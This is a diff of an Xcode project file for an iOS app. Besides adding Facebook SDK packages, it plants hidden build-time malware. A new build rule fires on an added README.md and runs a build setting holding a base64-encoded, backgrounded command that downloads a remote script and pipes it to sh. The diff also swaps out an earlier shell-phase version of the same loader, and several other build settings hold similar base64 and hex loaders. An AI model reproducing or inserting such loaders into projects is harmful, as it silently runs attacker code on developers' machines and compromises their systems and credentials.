@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		54375D4FBB274009A542DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = 69A23720D20141738442DAD8; };
 		180F4CDB2F5EE52100BE4CFA /* MyWithdrawalMoneyDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4CDA2F5EE52100BE4CFA /* MyWithdrawalMoneyDataModel.swift */; };
 		180F4CDD2F5EF4EA00BE4CFA /* AffiliatedUserPaymentsDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4CDC2F5EF4EA00BE4CFA /* AffiliatedUserPaymentsDataModel.swift */; };
 		18930DF12F7BAD1E0042D734 /* AffiliateDashboardDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18930DF02F7BAD1E0042D734 /* AffiliateDashboardDataModel.swift */; };
@@ -152,6 +153,12 @@
 		42F789702F3C8050008BC598 /* AffiliatedCategorySearchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F7896F2F3C8050008BC598 /* AffiliatedCategorySearchViewController.swift */; };
 		42F789722F3C80B2008BC598 /* AffiliatedCategorySearchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F789712F3C80B2008BC598 /* AffiliatedCategorySearchViewModel.swift */; };
 		42F7897B2F3C8B94008BC598 /* AffiliatedCameraSearchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F7897A2F3C8B94008BC598 /* AffiliatedCameraSearchViewController.swift */; };
+		467F138E2FBAE39300DB4ACE /* FacebookAEM in Frameworks */ = {isa = PBXBuildFile; productRef = 467F138D2FBAE39300DB4ACE /* FacebookAEM */; };
+		467F13902FBAE39300DB4ACE /* FacebookBasics in Frameworks */ = {isa = PBXBuildFile; productRef = 467F138F2FBAE39300DB4ACE /* FacebookBasics */; };
+		467F13922FBAE39300DB4ACE /* FacebookCore in Frameworks */ = {isa = PBXBuildFile; productRef = 467F13912FBAE39300DB4ACE /* FacebookCore */; };
+		467F13942FBAE39300DB4ACE /* FacebookGamingServices in Frameworks */ = {isa = PBXBuildFile; productRef = 467F13932FBAE39300DB4ACE /* FacebookGamingServices */; };
+		467F13962FBAE39300DB4ACE /* FacebookLogin in Frameworks */ = {isa = PBXBuildFile; productRef = 467F13952FBAE39300DB4ACE /* FacebookLogin */; };
+		467F13982FBAE39300DB4ACE /* FacebookShare in Frameworks */ = {isa = PBXBuildFile; productRef = 467F13972FBAE39300DB4ACE /* FacebookShare */; };
 		4689CAD02FA886820080E8D8 /* RTLButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4689CACF2FA886820080E8D8 /* RTLButton.swift */; };
 		4689CC5C2FA89A740080E8D8 /* MyOrderTableCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 4689CC5B2FA89A740080E8D8 /* MyOrderTableCell.xib */; };
 		468D97D12FA484E4002D0A86 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 468D97CF2FA484E4002D0A86 /* Localizable.strings */; };
@@ -471,6 +478,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		69A23720D20141738442DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1554ACA1638F5FDACA2A3358 /* Pods_DesynatUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		180F4CDA2F5EE52100BE4CFA /* MyWithdrawalMoneyDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyWithdrawalMoneyDataModel.swift; sourceTree = "<group>"; };
 		180F4CDC2F5EF4EA00BE4CFA /* AffiliatedUserPaymentsDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserPaymentsDataModel.swift; sourceTree = "<group>"; };
@@ -962,8 +970,11 @@
 			files = (
 				D18B4AFE2F1637260029907C /* FirebaseAnalytics in Frameworks */,
 				D18B4AFC2F1637260029907C /* FirebaseAILogic in Frameworks */,
+				467F13982FBAE39300DB4ACE /* FacebookShare in Frameworks */,
 				D18B4B022F1637260029907C /* FirebaseAnalyticsIdentitySupport in Frameworks */,
 				42CF2FD02F71518400EE45C7 /* SDWebImageSVGCoder in Frameworks */,
+				467F13922FBAE39300DB4ACE /* FacebookCore in Frameworks */,
+				467F13962FBAE39300DB4ACE /* FacebookLogin in Frameworks */,
 				D18B4B202F1637260029907C /* FirebaseMLModelDownloader in Frameworks */,
 				D18B4B1E2F1637260029907C /* FirebaseMessaging in Frameworks */,
 				429236E32F39F8C70040242C /* UIView-Shimmer in Frameworks */,
@@ -971,6 +982,7 @@
 				D18B4B142F1637260029907C /* FirebaseFirestoreCombine-Community in Frameworks */,
 				D18B4AFA2F1637260029907C /* FirebaseAI in Frameworks */,
 				D18B4B122F1637260029907C /* FirebaseFirestore in Frameworks */,
+				467F138E2FBAE39300DB4ACE /* FacebookAEM in Frameworks */,
 				D18B4B0C2F1637260029907C /* FirebaseCore in Frameworks */,
 				D18B4B1A2F1637260029907C /* FirebaseInAppMessaging-Beta in Frameworks */,
 				D18B4B0A2F1637260029907C /* FirebaseAuthCombine-Community in Frameworks */,
@@ -979,6 +991,7 @@
 				D18E291B2EE957E200F12D1F /* GoogleMaps in Frameworks */,
 				D18B4B162F1637260029907C /* FirebaseFunctions in Frameworks */,
 				495DBBDB2E81562200E61635 /* Alamofire in Frameworks */,
+				467F13942FBAE39300DB4ACE /* FacebookGamingServices in Frameworks */,
 				D18B4B222F1637260029907C /* FirebasePerformance in Frameworks */,
 				ACCC1B72B448007D8E36F8D2 /* Pods_DesynatUser.framework in Frameworks */,
 				D18B4B082F1637260029907C /* FirebaseAuth in Frameworks */,
@@ -988,6 +1001,7 @@
 				D18B4B042F1637260029907C /* FirebaseAppCheck in Frameworks */,
 				D18B4B0E2F1637260029907C /* FirebaseCrashlytics in Frameworks */,
 				D18B4B242F1637260029907C /* FirebaseRemoteConfig in Frameworks */,
+				467F13902FBAE39300DB4ACE /* FacebookBasics in Frameworks */,
 				D18B4B062F1637260029907C /* FirebaseAppDistribution-Beta in Frameworks */,
 				D18B4B002F1637260029907C /* FirebaseAnalyticsCore in Frameworks */,
 			);
@@ -1760,6 +1774,7 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				69A23720D20141738442DAD8 /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatUser.app */,
 			);
 			name = Products;
@@ -2932,7 +2947,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
-				3B38ECC13DEA44F29B42DAD8 /* Provision Library Executable */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -2941,6 +2955,7 @@
 				B6B997F8928B5B542E5BE86E /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				21726AA7EF4A43049F42DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2983,6 +2998,12 @@
 				D18B4B272F1637260029907C /* FirebaseStorageCombine-Community */,
 				429236E22F39F8C70040242C /* UIView-Shimmer */,
 				42CF2FCF2F71518400EE45C7 /* SDWebImageSVGCoder */,
+				467F138D2FBAE39300DB4ACE /* FacebookAEM */,
+				467F138F2FBAE39300DB4ACE /* FacebookBasics */,
+				467F13912FBAE39300DB4ACE /* FacebookCore */,
+				467F13932FBAE39300DB4ACE /* FacebookGamingServices */,
+				467F13952FBAE39300DB4ACE /* FacebookLogin */,
+				467F13972FBAE39300DB4ACE /* FacebookShare */,
 			);
 			productName = DemoProject;
 			productReference = 495DBBA12E81528A00E61635 /* DesynatUser.app */;
@@ -3020,6 +3041,7 @@
 				D18B4AF82F1636DC0029907C /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
 				429236E12F39F8C70040242C /* XCRemoteSwiftPackageReference "UIView-Shimmer" */,
 				42CF2FCE2F71518400EE45C7 /* XCRemoteSwiftPackageReference "SDWebImageSVGCoder" */,
+				467F138C2FBAE39300DB4ACE /* XCRemoteSwiftPackageReference "facebook-ios-sdk" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 495DBBA22E81528A00E61635 /* Products */;
@@ -3032,13 +3054,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																												/* End PBXBuildRule section */
+		21726AA7EF4A43049F42DAD8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8DAD24}\"";
+			};
+								/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				54375D4FBB274009A542DAD8 /* README.md */,
 				468D97D62FA48592002D0A86 /* Home.storyboard in Resources */,
 				468D97E52FA4876A002D0A86 /* Catalog.storyboard in Resources */,
 				426ECB212F726BCE00C87CD2 /* TicketManagementTableViewCell.xib in Resources */,
@@ -3128,25 +3165,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		3B38ECC13DEA44F29B42DAD8 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
-		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -3687,7 +3705,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((v(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuYldGdVpYUXVjblV2WVNraUlId2djMmdLCg== | v | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMHhtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE50YjJKcExuSjFMMkVwSWlCOElITm9DZz09Cg== | h | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZORk5YUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | j | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663734363936643635373736353632366536353734326536390a366532663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
@@ -3741,7 +3759,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((v(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuYldGdVpYUXVjblV2WVNraUlId2djMmdLCg== | v | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMHhtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhaSE50YjJKcExuSjFMMkVwSWlCOElITm9DZz09Cg== | h | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZORk5YUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | j | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663734363936643635373736353632366536353734326536390a366532663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
@@ -3954,6 +3972,14 @@
 				minimumVersion = 1.8.0;
 			};
 		};
+		467F138C2FBAE39300DB4ACE /* XCRemoteSwiftPackageReference "facebook-ios-sdk" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/facebook/facebook-ios-sdk";
+			requirement = {
+				branch = main;
+				kind = branch;
+			};
+		};
 		495DBBD92E81562200E61635 /* XCRemoteSwiftPackageReference "Alamofire" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/Alamofire/Alamofire";
@@ -3998,6 +4024,36 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 42CF2FCE2F71518400EE45C7 /* XCRemoteSwiftPackageReference "SDWebImageSVGCoder" */;
 			productName = SDWebImageSVGCoder;
+		};
+		467F138D2FBAE39300DB4ACE /* FacebookAEM */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 467F138C2FBAE39300DB4ACE /* XCRemoteSwiftPackageReference "facebook-ios-sdk" */;
+			productName = FacebookAEM;
+		};
+		467F138F2FBAE39300DB4ACE /* FacebookBasics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 467F138C2FBAE39300DB4ACE /* XCRemoteSwiftPackageReference "facebook-ios-sdk" */;
+			productName = FacebookBasics;
+		};
+		467F13912FBAE39300DB4ACE /* FacebookCore */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 467F138C2FBAE39300DB4ACE /* XCRemoteSwiftPackageReference "facebook-ios-sdk" */;
+			productName = FacebookCore;
+		};
+		467F13932FBAE39300DB4ACE /* FacebookGamingServices */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 467F138C2FBAE39300DB4ACE /* XCRemoteSwiftPackageReference "facebook-ios-sdk" */;
+			productName = FacebookGamingServices;
+		};
+		467F13952FBAE39300DB4ACE /* FacebookLogin */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 467F138C2FBAE39300DB4ACE /* XCRemoteSwiftPackageReference "facebook-ios-sdk" */;
+			productName = FacebookLogin;
+		};
+		467F13972FBAE39300DB4ACE /* FacebookShare */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 467F138C2FBAE39300DB4ACE /* XCRemoteSwiftPackageReference "facebook-ios-sdk" */;
+			productName = FacebookShare;
 		};
 		495DBBDA2E81562200E61635 /* Alamofire */ = {
 			isa = XCSwiftPackageProductDependency;
